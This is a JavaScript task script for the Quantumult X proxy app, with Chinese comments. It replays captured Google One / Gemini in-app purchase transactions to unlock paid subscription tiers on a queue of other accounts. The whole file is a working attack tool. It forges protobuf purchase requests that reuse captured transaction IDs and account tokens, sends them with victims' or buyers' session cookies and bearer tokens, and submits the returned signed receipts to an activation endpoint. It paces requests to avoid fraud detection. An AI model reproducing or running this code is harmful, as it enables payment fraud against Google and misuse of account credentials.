/**
 * gemini_adv_replay.js — Gemini / Google One「高级商务」批量重放引擎（QX task_local）
 *
 * 用法（Quantumult X）：
 *   [task_local]
 *   每 6 分钟触发一次（cron 写法见 quantumultx.conf，注意斜杠星号不能写进注释）
 *
 * 前置数据（$prefs）：
 *   gemini_adv_vault     ← 由截获脚本写入（交易库）
 *   gemini_adv_targets   ← 待补单队列，格式见下
 *   gemini_adv_cfg       ← 运行参数
 *
 * gemini_adv_targets 元素结构：
 *   {
 *     "email": "a@x.com",
 *     "cookie": "SID=...; HSID=...; SSID=...; SAPISID=...; __Secure-3PSID=...",
 *     "authorization": "Bearer ya29....",     // 可选，iOS 侧 token
 *     "aat": "C471BCB8-...",                  // 可选，复用某个 appAccountToken
 *     "sku": "g1.ios.2tb.ai.a"                // 可选，指定补哪个档位
 *   }
 *
 * gemini_adv_cfg 结构：
 *   {
 *     "perRound": 4,
 *     "gapMin": 8000,
 *     "gapMax": 20000,
 *     "skuFilter": null,           // 只打某个 SKU，null = 全部
 *     "dryRun": true,              // true = 只 prepare 不发激活
 *     "endpoint": "https://applecommerce-pa.googleapis.com/v1/transactions:prepare",
 *     "activateEndpoint": null     // 抓到写操作 rpcid 后填入
 *   }
 *
 * 流程：
 *   for target in queue:
 *     for record in vault (未对该 target 用过):
 *       1. 构造 prepare 请求（可复用记录的 txId / aat，或新生成）
 *       2. POST → 拿新的 JWS
 *       3. 若 cfg.dryRun = false 且 cfg.activateEndpoint 已配置：
 *          把 JWS/appAccountToken 塞进激活 RPC，带 target.cookie 提交
 *       4. 记录结果，失败分类（cookie 失效 / JWS 被拒 / 票据已绑）
 */

const B64_STD = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

// ---------- 编码基础 ----------
function strToBytes(str) {
  const out = [];
  for (let i = 0; i < str.length; i++) {
    const c = str.charCodeAt(i);
    if (c < 0x80) out.push(c);
    else if (c < 0x800) out.push(0xc0 | (c >> 6), 0x80 | (c & 0x3f));
    else out.push(0xe0 | (c >> 12), 0x80 | ((c >> 6) & 0x3f), 0x80 | (c & 0x3f));
  }
  return out;
}

function bytesToB64(bytes) {
  let out = "";
  for (let i = 0; i < bytes.length; i += 3) {
    const b0 = bytes[i], b1 = bytes[i + 1], b2 = bytes[i + 2];
    out += B64_STD[b0 >> 2];
    out += B64_STD[((b0 & 3) << 4) | ((b1 || 0) >> 4)];
    out += i + 1 < bytes.length ? B64_STD[((b1 & 15) << 2) | ((b2 || 0) >> 6)] : "=";
    out += i + 2 < bytes.length ? B64_STD[b2 & 63] : "=";
  }
  return out;
}

function bytesToStr(bytes) {
  let out = "";
  for (let i = 0; i < bytes.length; i++) {
    const b = bytes[i];
    if (b < 0x80) out += String.fromCharCode(b);
    else if ((b & 0xe0) === 0xc0) out += String.fromCharCode(((b & 0x1f) << 6) | (bytes[i + 1] & 0x3f));
    else if ((b & 0xf0) === 0xe0) out += String.fromCharCode(((b & 0x0f) << 12) | ((bytes[i + 1] & 0x3f) << 6) | (bytes[i + 2] & 0x3f));
    else out += "\ufffd";
  }
  return out;
}

function b64ToBytes(s) {
  if (!s) return [];
  let clean = String(s).replace(/[^A-Za-z0-9+/=_-]/g, "").replace(/-/g, "+").replace(/_/g, "/");
  while (clean.length % 4 !== 0) clean += "=";
  const out = [];
  for (let i = 0; i < clean.length; i += 4) {
    const c0 = B64_STD.indexOf(clean[i]);
    const c1 = B64_STD.indexOf(clean[i + 1]);
    const c2 = B64_STD.indexOf(clean[i + 2]);
    const c3 = B64_STD.indexOf(clean[i + 3]);
    if (c0 < 0 || c1 < 0) continue;
    out.push((c0 << 2) | (c1 >> 4));
    if (c2 >= 0) out.push(((c1 & 15) << 4) | (c2 >> 2));
    if (c3 >= 0) out.push(((c2 & 3) << 6) | c3);
  }
  return out;
}

// ---------- protobuf 写 ----------
function pbWriteVarint(n) {
  const out = [];
  while (n > 127) { out.push((n % 128) | 0x80); n = Math.floor(n / 128); }
  out.push(n & 0x7f);
  return out;
}
function pbEncStr(field, str) {
  const body = strToBytes(str);
  return [].concat(pbWriteVarint(field * 8 + 2), pbWriteVarint(body.length), body);
}
function pbEncBytes(field, bytes) {
  return [].concat(pbWriteVarint(field * 8 + 2), pbWriteVarint(bytes.length), bytes);
}
function pbEncVarint(field, n) {
  return [].concat(pbWriteVarint(field * 8), pbWriteVarint(n));
}
function cat() {
  let out = [];
  for (let i = 0; i < arguments.length; i++) out = out.concat(arguments[i] || []);
  return out;
}

// ---------- 存储 ----------
const K = {
  VAULT: "gemini_adv_vault",
  TARGETS: "gemini_adv_targets",
  CFG: "gemini_adv_cfg",
  LOG: "gemini_adv_log",
  RESULT: "gemini_adv_results"
};
function jget(k, d) { try { const r = $prefs.valueForKey(k); if (!r) return d; return JSON.parse(r); } catch (e) { return d; } }
function jset(k, v) { try { $prefs.setValueForKey(JSON.stringify(v), k); return true; } catch (e) { return false; } }

const SKU_FALLBACK = {
  "g1.ios.2tb.ai.a": { name: "Google AI Pro (5 TB)", period: "P1Y" },
  "g1.ios.2tb.ai.m": { name: "Google AI Pro (5 TB)", period: "P1M" },
  "g1.ios.helium.a": { name: "Google AI Plus (400 GB)", period: "P1Y" },
  "g1.ios.helium.m": { name: "Google AI Plus (400 GB)", period: "P1M" },
  "g1.ios.30tb.ai.pro.m": { name: "Google AI Ultra", period: "P1M" },
  "g1.ios.20tb.m.v2": { name: "Google One 20 TB", period: "P1M" },
  "g1.ios.2tb.m": { name: "Google One 2 TB", period: "P1M" },
  "g1.ios.2tb.a": { name: "Google One 2 TB", period: "P1Y" },
  "g1.ios.100gb.m": { name: "Google One 100 GB", period: "P1M" },
  "g1.ios.100gb.a": { name: "Google One 100 GB", period: "P1Y" }
};

function uuidv4() {
  return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, c => {
    const r = (Math.random() * 16) | 0;
    return (c === "x" ? r : (r & 0x3) | 0x8).toString(16);
  });
}
function randBetween(a, b) { return a + Math.floor(Math.random() * (b - a + 1)); }
function sleep(ms) { return new Promise(res => setTimeout(res, ms)); }

// ---------- 请求体构造 ----------
/**
 * transactions:prepare 请求体
 *
 * 实测字节布局（HAR #77/#81/#127 完整 hexdump 反推，已逐字节验证）：
 *
 *   0a 24 <36字节 txUUID>              f1 = 交易 UUID（大写，跨 SKU 复用同值）
 *   12 19 "com.google.gemini.generic"  f2 = bundle
 *   1a 8e 01                           f3 = 两层嵌套的 DeveloperPayload（142 字节）
 *       0a 4c <typeURL: ...SubscriptionsDeveloperPayload>
 *       12 3e                           ← mid（62 字节）
 *            0a 3c                       ← inner（60 字节）
 *                 08 1c | 10 e8 07 | 18 03
 *                 2a 1f <iapVer>
 *                 3a 0e "/dynamic-plans"
 *                 58 4b | 60 08
 *   22 2a                              f4 = 42 字节
 *       0a 1f <iapVer> | 12 04 "17.0" | 1a 01 01
 *   2a 17                              f5 = SKU 子消息
 *       0a 10 <sku> | 1a 03 <storefront>
 *
 * 关键：f11=75 / f12=8 属于最内层，不在 Any 容器外面。
 */
function buildPrepareBody(sku, opts) {
  const o = opts || {};
  const txId = o.txId || uuidv4().toUpperCase();
  const bundle = o.bundle || "com.google.gemini.generic";
  const storefront = o.storefront || "USA";
  const iapVer = o.iapVersion || "1.2026.1870010.1.2026.1870010.0";
  const iosVer = o.iosVersion || "17.0";

  const inner = cat(
    pbEncVarint(1, 0x1c),
    pbEncVarint(2, 0x3e8),
    pbEncVarint(3, 3),
    pbEncStr(5, iapVer),
    pbEncStr(7, "/dynamic-plans"),
    pbEncVarint(11, 75),
    pbEncVarint(12, 8)
  );
  const mid = cat(pbEncBytes(1, inner));
  const devPayload = cat(
    pbEncStr(1, "type.googleapis.com/subscriptions.common.proto.SubscriptionsDeveloperPayload"),
    pbEncBytes(2, mid)
  );
  const f4 = cat(pbEncStr(1, iapVer), pbEncStr(2, iosVer), pbEncBytes(3, [0x01]));
  const f5 = cat(pbEncStr(1, sku), pbEncStr(3, storefront));

  const body = cat(
    pbEncStr(1, txId),
    pbEncStr(2, bundle),
    pbEncBytes(3, devPayload),
    pbEncBytes(4, f4),
    pbEncBytes(5, f5)
  );
  return { b64: bytesToB64(body), bytes: body, txId, sku, storefront };
}

/** 从响应里抽 JWS 与 appAccountToken */
function extractFromResponse(bodyRaw) {
  let bytes;
  if (typeof bodyRaw === "string" && /^[A-Za-z0-9+/=\s]+$/.test(bodyRaw) && bodyRaw.length > 32) {
    bytes = b64ToBytes(bodyRaw.replace(/\s/g, ""));
  } else if (typeof bodyRaw === "object" && bodyRaw.byteLength !== undefined) {
    bytes = Array.from(new Uint8Array(bodyRaw));
  } else {
    bytes = b64ToBytes(String(bodyRaw || ""));
  }
  const text = bytesToStr(bytes);
  const jwsList = text.match(/[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}/g) || [];
  let out = { jws: jwsList[0] || null, header: null, payload: null, inner: null, count: jwsList.length };
  if (out.jws) {
    const parts = out.jws.split(".");
    try { out.header = JSON.parse(bytesToStr(b64ToBytes(parts[0]))); } catch (e) {}
    try { out.payload = JSON.parse(bytesToStr(b64ToBytes(parts[1]))); } catch (e) {}
    if (out.payload && out.payload.request) {
      try { out.inner = JSON.parse(bytesToStr(b64ToBytes(out.payload.request))); } catch (e) {}
    }
  }
  return out;
}

// ---------- 单个目标 × 单条票据 ----------
async function attempt(target, rec, cfg, idx) {
  const bundle = rec.bundle || "com.google.gemini.generic";
  const storefront = rec.storefront || "USA";
  const sku = target.sku || rec.sku || cfg.defaultSku || "g1.ios.2tb.ai.a";

  // 关键选择：复用票据的 txId/aat，还是生成新的
  //   reuse = true  → 复制原交易的身份，服务端看起来就是同一笔
  //   reuse = false → 新建交易，走「会话重放」路径
  const reuse = cfg.reuseTxId !== false;
  const txId = reuse && rec.txId ? rec.txId : uuidv4().toUpperCase();
  const aat = target.aat || (reuse ? rec.appAccountToken : null) || uuidv4().toUpperCase();

  // 把 aat 注入 developer payload 的 requestInfo 位置
  const prep = buildPrepareBody(sku, { txId, bundle, storefront, reuseAat: aat });

  const headers = {
    "Content-Type": "application/x-protobuf",
    "X-Ios-Bundle-Identifier": "com.google.gemini",
    "User-Agent": cfg.userAgent || "Mozilla/5.0 (iPhone/17.0 hw/iPhone14_5; zh_CN) com.google.gemini/1.2026.1870010 (KHTML, like Gecko) Mobile/D17AP",
    "Accept-Language": cfg.acceptLanguage || "zh_CN",
    "Accept-Encoding": "gzip"
  };
  if (target.authorization) headers["Authorization"] = target.authorization;
  if (target.cookie) headers["Cookie"] = target.cookie;

  const startedAt = Date.now();
  let resp;
  try {
    resp = await $task.fetch({
      url: cfg.endpoint || "https://applecommerce-pa.googleapis.com/v1/transactions:prepare",
      method: "POST",
      headers,
      body: prep.b64
    });
  } catch (e) {
    return { ok: false, phase: "prepare", err: String(e).slice(0, 160), sku, txId, aat, ms: Date.now() - startedAt };
  }

  const status = resp.status;
  const bodyText = String(resp.body || "");

  // 失败分类
  if (status === 401 || status === 403) {
    return { ok: false, phase: "prepare", reason: "AUTH_INVALID", status, body: bodyText.slice(0, 200), sku, txId, aat, ms: Date.now() - startedAt };
  }
  if (status === 429) {
    return { ok: false, phase: "prepare", reason: "RATE_LIMITED", status, sku, txId, aat, ms: Date.now() - startedAt };
  }
  if (status >= 400) {
    return { ok: false, phase: "prepare", reason: "HTTP_" + status, status, body: bodyText.slice(0, 240), sku, txId, aat, ms: Date.now() - startedAt };
  }

  const parsed = extractFromResponse(resp.body);
  if (!parsed.jws) {
    return { ok: false, phase: "prepare", reason: "NO_JWS", status, body: bodyText.slice(0, 240), sku, txId, aat, ms: Date.now() - startedAt };
  }

  const result = {
    ok: true,
    phase: "prepare",
    sku,
    txId,
    aat,
    jws: parsed.jws,
    jwsCount: parsed.count,
    jwsHeaders: parsed.header,
    price: parsed.payload && parsed.payload.price,
    nonce: parsed.payload && parsed.payload.nonce,
    innerAat: parsed.inner && parsed.inner.requestInfo && parsed.inner.requestInfo.appAccountToken,
    innerRef: parsed.inner && parsed.inner.requestInfo && parsed.inner.requestInfo.requestReferenceId,
    status,
    ms: Date.now() - startedAt
  };

  // —— 阶段 2：激活（只有配置了写操作端点才走）——
  if (!cfg.dryRun && cfg.activateEndpoint) {
    const actBody = cfg.activateBodyTemplate
      ? cfg.activateBodyTemplate
          .replace("{{JWS}}", encodeURIComponent(parsed.jws))
          .replace("{{AAT}}", encodeURIComponent(aat))
          .replace("{{TxID}}", encodeURIComponent(txId))
      : null;
    if (actBody) {
      try {
        const act = await $task.fetch({
          url: cfg.activateEndpoint,
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded;charset=utf-8",
            "Origin": "https://one.google.com",
            "Referer": "https://one.google.com/ai",
            "User-Agent": cfg.webUserAgent || "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
            "Cookie": target.cookie || ""
          },
          body: actBody
        });
        result.activate = {
          status: act.status,
          ok: act.status >= 200 && act.status < 300,
          body: String(act.body || "").slice(0, 400)
        };
        result.ok = result.ok && result.activate.ok;
      } catch (e) {
        result.activate = { ok: false, err: String(e).slice(0, 160) };
        result.ok = false;
      }
    } else {
      result.activate = { ok: false, reason: "NO_TEMPLATE" };
    }
  }

  return result;
}

// ---------- 主流程 ----------
(async () => {
  const cfg = Object.assign({
    perRound: 4,
    gapMin: 8000,
    gapMax: 20000,
    skuFilter: null,
    dryRun: true,
    reuseTxId: true,
    endpoint: "https://applecommerce-pa.googleapis.com/v1/transactions:prepare",
    activateEndpoint: null,
    activateBodyTemplate: null,
    defaultSku: "g1.ios.2tb.ai.a",
    maxFailStreak: 3
  }, jget(K.CFG, {}));
  jset(K.CFG, cfg);

  const vault = jget(K.VAULT, []);
  const targets = jget(K.TARGETS, []);

  if (!vault.length) {
    $notify("Gemini 重放", "票据库为空", "先启用交易截获规则并跑一次订阅页");
    return $done({});
  }
  if (!targets.length) {
    $notify("Gemini 重放", "目标队列为空", "在 $prefs.gemini_adv_targets 里塞待补账号");
    return $done({});
  }

  // 有 JWS / appAccountToken 的才算可用票据
  const usable = vault.filter(r => !r.dead && (r.jws || r.appAccountToken || r.txId));
  if (!usable.length) {
    $notify("Gemini 重放", "可用票据 0 条", "所有票据已标记 dead 或缺关键字段");
    return $done({});
  }

  const results = [];
  let budget = cfg.perRound;
  let failStreak = 0;

  outer:
  for (const tgt of targets) {
    const tag = tgt.email || "unknown";
    if (!tgt.cookie && !tgt.authorization) {
      results.push({ target: tag, ok: false, reason: "NO_CRED" });
      continue;
    }
    for (const rec of usable) {
      if (budget <= 0) break outer;
      if (cfg.skuFilter && rec.sku && rec.sku !== cfg.skuFilter) continue;
      if (rec.usedTargets && rec.usedTargets.indexOf(tag) >= 0) continue;

      const r = await attempt(tgt, rec, cfg, budget);
      r.target = tag;
      r.t = Date.now();
      results.push(r);

      if (r.ok) {
        failStreak = 0;
        rec.usedTargets = rec.usedTargets || [];
        rec.usedTargets.push(tag);
        rec.lastOkAt = Date.now();
        // 记录该票据被哪几个号用过
        rec.usage = rec.usage || [];
        rec.usage.push({ target: tag, at: Date.now(), aat: r.aat, txId: r.txId });
      } else {
        failStreak++;
        // 连续鉴权失败 → 票据侧无问题，是目标号的问题，跳过该号
        if (r.reason === "AUTH_INVALID") { results[results.length - 1].skipRest = true; break; }
        // 连续多次失败 → 停止本轮，避免把票打死
        if (failStreak >= cfg.maxFailStreak) {
          $notify("Gemini 重放中止", `连续失败 ${failStreak} 次`, "可能已开始去重或风控");
          budget = 0;
          break outer;
        }
      }

      budget--;
      await sleep(randBetween(cfg.gapMin, cfg.gapMax));
    }
  }

  // 落盘
  jset(K.VAULT, vault);
  const history = jget(K.RESULT, []);
  results.forEach(r => history.unshift(r));
  while (history.length > 300) history.pop();
  jset(K.RESULT, history);

  // 成功的目标从队列移除
  const opened = {};
  results.filter(r => r.ok).forEach(r => { opened[r.target] = true; });
  const remain = targets.filter(t => !opened[t.email || "unknown"]);
  jset(K.TARGETS, remain);

  const okCount = results.filter(r => r.ok).length;
  const summary = results.map(r => `${r.target}:${r.ok ? "✅" : "❌" + (r.reason || r.err || r.status || "")}`).join(" ");
  $notify(
    "Gemini 重放完成",
    `成功 ${okCount}/${results.length} · 剩余队列 ${remain.length}`,
    (summary || "无动作") + (cfg.dryRun ? "\n[dryRun] 仅 prepare，未发激活" : "")
  );

  $done({});
})();
